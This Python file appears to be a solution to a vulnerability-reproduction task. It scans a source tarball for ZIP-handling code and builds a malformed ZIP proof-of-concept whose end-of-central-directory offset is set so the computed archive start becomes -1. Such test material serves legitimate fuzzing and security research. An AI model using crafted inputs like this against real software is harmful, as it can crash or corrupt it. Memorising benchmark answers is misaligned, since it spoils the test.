import os
import io
import re
import tarfile
import struct
from typing import Optional


class Solution:
    def _tar_iter_text_members(self, tf: tarfile.TarFile):
        for m in tf.getmembers():
            if not m.isreg():
                continue
            n = m.name.lower()
            if n.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh")):
                yield m

    def _read_member_text(self, tf: tarfile.TarFile, m: tarfile.TarInfo, limit: int = 262144) -> str:
        f = tf.extractfile(m)
        if f is None:
            return ""
        try:
            b = f.read(limit)
        finally:
            try:
                f.close()
            except Exception:
                pass
        return b.decode("latin-1", errors="ignore")

    def _detect_zip_and_constraints(self, src_path: str) -> tuple[bool, bool]:
        is_zip_related = False
        fname_zero_invalid = False

        zip_name_hint = re.compile(r"(zip|pkzip|miniz|libzip|archive_read.*zip|central.*directory|eocd)", re.IGNORECASE)
        zip_marker_hint = re.compile(r"(0x06054b50|0x02014b50|0x04034b50|PK\\005\\006|PK\\001\\002|PK\\003\\004|end of central directory|central directory)", re.IGNORECASE)
        fname_zero_hint = re.compile(r"(filename|file name|fname)[^;\n]{0,80}==\s*0", re.IGNORECASE)

        total_read = 0
        max_total = 24 * 1024 * 1024

        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = list(self._tar_iter_text_members(tf))
                members.sort(key=lambda x: (0 if zip_name_hint.search(x.name) else 1, x.size))
                for m in members:
                    if total_read >= max_total:
                        break
                    if m.size <= 0:
                        continue
                    txt = self._read_member_text(tf, m, limit=262144)
                    total_read += min(m.size, 262144)
                    if not is_zip_related and (zip_name_hint.search(m.name) or zip_marker_hint.search(txt)):
                        is_zip_related = True
                    if is_zip_related and not fname_zero_invalid and fname_zero_hint.search(txt):
                        fname_zero_invalid = True
                    if is_zip_related and fname_zero_invalid:
                        break
        except Exception:
            pass

        return is_zip_related, fname_zero_invalid

    def _build_zip_poc(self, filename_len: int) -> bytes:
        if filename_len < 0:
            filename_len = 0
        if filename_len > 255:
            filename_len = 255
        filename = b"A" * filename_len

        cd_sig = 0x02014B50
        ver_made = 20
        ver_need = 20
        gp_flags = 0
        comp_method = 0
        mod_time = 0
        mod_date = 0
        crc32 = 0
        comp_size = 0
        uncomp_size = 0
        fname_len = filename_len
        extra_len = 0
        comment_len = 0
        disk_start = 0
        int_attr = 0
        ext_attr = 0
        local_hdr_off = 0

        cd_fixed = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            cd_sig,
            ver_made,
            ver_need,
            gp_flags,
            comp_method,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            fname_len,
            extra_len,
            comment_len,
            disk_start,
            int_attr,
            ext_attr,
            local_hdr_off,
        )
        cd = cd_fixed + filename
        cd_size = len(cd)

        eocd_sig = 0x06054B50
        disk_no = 0
        cd_disk_no = 0
        entries_disk = 1
        entries_total = 1
        cd_offset = 1  # makes computed archive start = (actual_cd_pos) - cd_offset = -1

        eocd = struct.pack(
            "<IHHHHIIH",
            eocd_sig,
            disk_no,
            cd_disk_no,
            entries_disk,
            entries_total,
            cd_size,
            cd_offset,
            0,
        )

        return cd + eocd

    def solve(self, src_path: str) -> bytes:
        is_zip, fname_zero_invalid = self._detect_zip_and_constraints(src_path)
        # Even if detection fails, defaulting to ZIP is a reasonable guess for this bug description.
        filename_len = 1 if fname_zero_invalid else 0
        return self._build_zip_poc(filename_len)